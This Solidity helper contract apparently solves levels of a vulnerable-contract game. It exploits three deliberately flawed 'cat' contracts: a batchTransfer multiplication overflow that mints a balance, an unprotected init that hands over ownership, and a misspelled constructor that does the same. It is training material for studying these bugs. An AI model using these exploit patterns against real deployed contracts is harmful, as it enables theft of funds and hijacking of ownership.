// SPDX-License-Identifier: WTFPL
pragma solidity ^0.8.30;

// Helper for the v4 cats whose caress needs a setup step (OverflowCat / UnprotectedCat /
// MisspelledCat), analogous to Seeker (ReentrancyCat) and Prophet (PredictableCat). Doing the
// setup and the caress in ONE transaction makes the outcome atomic: on-chain txs from the single
// shared sender execute in strict nonce order, so the setup state a caress relies on can never be
// undone by a concurrent caress. The Meow event is emitted by the cat with this contract as
// msg.sender (same as Seeker/Prophet); the website surfaces the real EOA from the receipt.

interface IOverflowCat {
    function balance(address) external view returns (uint256);
    function batchTransfer(address[] memory receivers, uint256 value) external;
    function caress() external;
}

interface IUnprotectedCat {
    function owner() external view returns (address);
    function init(address o) external;
    function caress() external;
}

interface IMisspelledCat {
    function owner() external view returns (address);
    function MisspeledCat(address o) external;
    function caress() external;
}

contract Caretaker {
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    // OverflowCat: grant this contract a balance via the batchTransfer multiplication overflow,
    // then caress. Idempotent — once primed the balance stays non-zero, so the conditional never
    // re-overflows it back to zero (the bug a plain client-side caress hits under concurrency).
    function overflow(address cat) external {
        IOverflowCat c = IOverflowCat(cat);
        if (c.balance(address(this)) == 0) {
            address[] memory r = new address[](2);
            r[0] = address(this);
            r[1] = DEAD;
            c.batchTransfer(r, 1 << 255); // 2*2^255 overflows to 0, bypassing the balance check
        }
        c.caress();
    }

    // UnprotectedCat: claim ownership through the unprotected init, then caress.
    function claim(address cat) external {
        IUnprotectedCat c = IUnprotectedCat(cat);
        if (c.owner() != address(this)) c.init(address(this));
        c.caress();
    }

    // MisspelledCat: claim ownership through the misspelled "constructor", then caress.
    function rename(address cat) external {
        IMisspelledCat c = IMisspelledCat(cat);
        if (c.owner() != address(this)) c.MisspeledCat(address(this));
        c.caress();
    }
}
